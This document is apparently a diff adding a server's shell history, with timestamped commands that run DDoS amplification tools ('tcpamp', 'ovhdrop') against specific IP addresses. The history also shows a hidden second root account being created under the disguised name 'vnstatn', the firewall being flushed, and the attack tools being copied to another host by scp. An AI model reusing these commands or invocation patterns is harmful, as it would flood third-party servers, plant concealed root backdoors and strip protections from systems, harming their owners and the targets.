@@ -1,0 +1,184 @@
+#1659475950
+screen -x
+#1659475863
+apt-get install screen
+#1659475873
+cd /media/
+#1659475873
+ls
+#1659475876
+screen -x
+#1659475878
+screen 
+#1659475888
+ls
+#1659475895
+chmod +x kgb
+#1659475896
+cd st
+#1659475897
+ls
+#1659475900
+chmod +x *
+#1659475900
+ls
+#1659475901
+cd ..
+#1659475904
+cd amp
+#1659475904
+ls
+#1659475909
+chmod +x *
+#1659475910
+ls
+#1659475911
+cd ..
+#1659475913
+cd root
+#1659475913
+ls
+#1659475918
+chmod +x *
+#1659475919
+lks
+#1659475920
+ls
+#1659475922
+screen -x
+#1659475926
+vnstat -l
+#1659475933
+apt-get install vnstat
+#1659475939
+vnstat -l
+#1659475975
+nmtui
+#1659475984
+apt-get install nmtui
+#1659475989
+htop
+#1659475994
+apt-get install htop
+#1659475998
+htop
+#1659476006
+vnstat -l -i
+#1659476010
+vnstat -l -i ens192
+#1659476014
+vnstat -l -i eno1
+#1659474807
+ls
+#1659474980
+sudo passwd roo
+#1659474981
+sudo passwd root
+#1659527622
+vnstat -l -i eno1
+#1660305721
+ls
+#1660305742
+cd /media
+#1660305743
+ls
+#1660305750
+nano checkStatus.sh 
+#1660305760
+screen
+#1660305784
+ls
+#1660305787
+screen -ls
+#1660305801
+vnstat -l
+#1660837615
+w
+#1660837621
+ls -la
+#1660837837
+w
+#1660838431
+ip a
+#1660838453
+vnstat -l 
+#1660902268
+useradd -M -ou 0 -g 0 vnstatn
+#1660902279
+passwd vnstatn
+#1660902293
+iptables -F
+#1660902329
+exit
+#1660902405
+w
+#1660902409
+exit
+#1660902657
+./tcpamp 38.84.14.4 0 tcpbgp.txt 10 20
+#1660902696
+./tcpamp 148.251.238.46 19999 tcpbgp.txt 10 20
+#1660902724
+./tcpamp 148.251.238.46 19999 tcpbgp.txt 50 20
+#1660902735
+./tcpamp 148.251.238.46 19999 tcpbgp.txt -1 20
+#1660902742
+./tcpamp 148.251.238.46 19999 tcpbgp.txt 100 20
+#1660902757
+ls
+#1660902792
+./ovhdrop
+#1660902855
+./ovhdrop 51.83.67.106 80 20 2 10
+#1660902871
+./ovhdrop 51.83.67.106 53 20 2 10
+#1660902908
+ls -la
+#1660902932
+./ovhdrop 51.83.67.106 53 20 53.txt 10
+#1660902942
+./ovhdrop 51.83.67.106 53 20 20 10
+#1660902953
+w
+#1660902959
+ls -la
+#1660902966
+cd ..
+#1660902968
+ls
+#1660902977
+nano checkStatus.sh 
+#1660902987
+./sv
+#1660903000
+nano nohup.out 
+#1660903011
+screen -r
+#1660903029
+screen -r 925.pts-0.MTLJS15
+#1660903041
+cd ..
+#1660903042
+ls
+#1660903045
+cd /root
+#1660903046
+ls
+#1660903075
+./tcpamp 148.251.238.46 19999 tcpbgp.txt 50 20
+#1660903096
+./tcpamp
+#1660903109
+./tcpamp 148.251.238.46 19999 tcpamp.txt 50 20
+#1660903125
+vnstat -l
+#1660903137
+exit
+#1660905057
+cd /media/amp/
+#1660905058
+ls -la
+#1660905124
+scp tcpamp tcpamp.txt tcpbgp.txt root@107.155.103.74:/root
+#1660905215
+exit
